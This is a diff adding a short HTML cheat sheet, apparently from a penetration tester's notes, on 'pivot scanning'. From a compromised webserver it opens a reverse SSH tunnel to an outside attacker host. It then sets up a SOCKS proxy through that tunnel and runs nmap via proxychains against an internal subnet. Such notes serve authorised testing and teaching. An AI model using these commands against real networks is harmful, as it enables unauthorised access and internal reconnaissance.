@@ -1,0 +1,23 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Pivot scanning</title>
+</head><body><b><span style="font-size: 14pt">Pivot scanning</span><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+Scan internal network through compromised (web)server<br/>
+</span><br/>
+</b><span style="color: #000000">-f	run ssh in background<br/>
+-N	do not execute a remote command(useful for port forwarding)<br/>
+</span><span style="color: #ff0000"><br/>
+<br/>
+</span><b>Example</b><span style="color: #ff0000"><br/>
+</span><span style="color: #ff0000"><br/>
+attacker machine<br/>
+</span><span style="color: #0000ff">webserver<br/>
+hax0r is user on webserver<br/>
+<br/>
+</span><tt><span style="color: #0000ff">root@adminsql:/var/www#</span>ssh -f -N -R <span style="color: #ff0000">2222</span>:<span style="color: #0000ff">127.0.0.1:22</span><span style="color: #ff0000">root@208.68.234.100<br/>
+</span><span style="color: #ff0000">root@kali:~#</span><span style="color: #000000">ssh -f -N -D </span><span style="color: #ff0000">127.0.0.1:8080</span><span style="color: #000000"/><span style="color: #ff0000">-p 2222 </span><span style="color: #0000ff">hax0r@127.0.0.1<br/>
+</span></tt><tt><span style="color: #000000">configure proxychains to use 127.0.0.1:8080</span></tt><br/>
+<tt><span style="color: #ff0000">root@kali:~#</span>proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24<br/>
+</tt></body></html>
